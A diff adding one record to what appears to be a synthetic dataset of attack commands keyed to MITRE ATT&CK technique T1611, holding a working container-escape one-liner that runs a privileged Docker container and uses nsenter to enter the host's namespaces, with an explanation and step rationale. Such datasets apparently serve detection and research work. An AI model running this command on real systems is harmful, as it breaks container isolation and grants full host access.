@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-1356d1fb-f336cdd6",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run --privileged --pid=host -it debian nsenter -t 1 -m -u -n -i sh",
+  "explanation": "Launches a privileged container and uses nsenter to switch to the host's namespace, gaining full access to the host.",
+  "rationale_steps": [
+    "Start a Docker container with elevated privileges and access to the host's PID namespace.",
+    "Use nsenter to transition into the host's namespace."
+  ],
+  "source_prompt_hash": "1356d1fb",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:27:59.937327Z"
+}
